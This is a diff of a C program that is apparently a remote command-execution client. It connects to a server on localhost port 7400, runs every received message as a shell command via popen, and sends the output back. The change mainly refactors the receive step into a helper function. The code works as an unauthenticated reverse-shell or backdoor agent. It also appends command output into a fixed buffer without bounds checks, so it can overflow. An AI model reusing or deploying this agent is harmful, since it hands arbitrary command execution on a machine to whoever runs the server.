@@ -12,9 +12,8 @@
 #define MYPORT 7400
 #define HOSTNAME "127.0.0.1"
 
-FILE *recv_msg(int sockfd, int msg_size) {
+FILE *recv_msg(int sockfd, char msg[], int msg_size) {
   /* Receive and process messages from the server */
-  char msg[msg_size];
   ssize_t bytes_received = recv(sockfd, msg, msg_size, 0);
 
   if (bytes_received < 0) {
@@ -27,8 +26,7 @@ FILE *recv_msg(int sockfd, int msg_size) {
     // Process the received  message here (e.g., execute commands)
     FILE *output_pipe = popen(msg, "r");
     if (!output_pipe) {
-      printf("Error executing command\n");
-      return -1;
+      error_and_exit("Error Executing Commands \n");
     }
 
     return output_pipe;
@@ -57,49 +55,36 @@ int main() {
   try_connect(sockfd, serv_addr);
 
   printf("Connected to server.\n");
-
   char msg[MSG_SIZE];
+
   char results[MSG_SIZE];
   ssize_t bytes_received;
 
   while (1) {
-    /* Receive and process messages from the server */
-    bytes_received = recv(sockfd, msg, MSG_SIZE, 0);
-    if (bytes_received < 0) {
-      error_and_exit("Error reading from socket \n");
-    } else if (bytes_received == 0) {
-      error_and_exit("Server disconnected \n");
-    } else {
-      msg[bytes_received] = '\0'; // Null-terminate the received message
-      printf("Received message from server: %s\n", msg);
-      // Process the received  message here (e.g., execute commands)
-      FILE *output_pipe = popen(msg, "r");
-      if (!output_pipe) {
-        printf("Error executing command\n");
-        return -1;
-      }
 
-      // Read the output of the command and send it back to the server
-      char output_buffer[MSG_SIZE];      // Adjust buffer size as needed
-      char result_buffer[MSG_SIZE] = ""; // Initialize an empty string buffer
-      while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
-        strcat(result_buffer,
-               output_buffer); // Append each line to the result buffer
-      }
+    // Process the received  message here (e.g., execute commands)
+    FILE *output_pipe = recv_msg(sockfd, msg, MSG_SIZE);
 
-      printf("%s", result_buffer);
-      printf("%ld\n", sizeof(result_buffer));
-
-      // Send the result buffer back to the server
-      if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
-        printf("Error sending response to server\n");
-        pclose(output_pipe);
-        return -1;
-      }
-
-      fflush(stdout);      // Ensure the data is sent immediately
-      pclose(output_pipe); // Close the output pipe
+    // Read the output of the command and send it back to the server
+    char output_buffer[MSG_SIZE];      // Adjust buffer size as needed
+    char result_buffer[MSG_SIZE] = ""; // Initialize an empty string buffer
+    while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
+      strcat(result_buffer,
+             output_buffer); // Append each line to the result buffer
     }
+
+    printf("%s", result_buffer);
+    printf("%ld\n", sizeof(result_buffer));
+
+    // Send the result buffer back to the server
+    if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
+      printf("Error sending response to server\n");
+      pclose(output_pipe);
+      return -1;
+    }
+
+    fflush(stdout);      // Ensure the data is sent immediately
+    pclose(output_pipe); // Close the output pipe
   }
   /* Close the socket */
   close(sockfd);
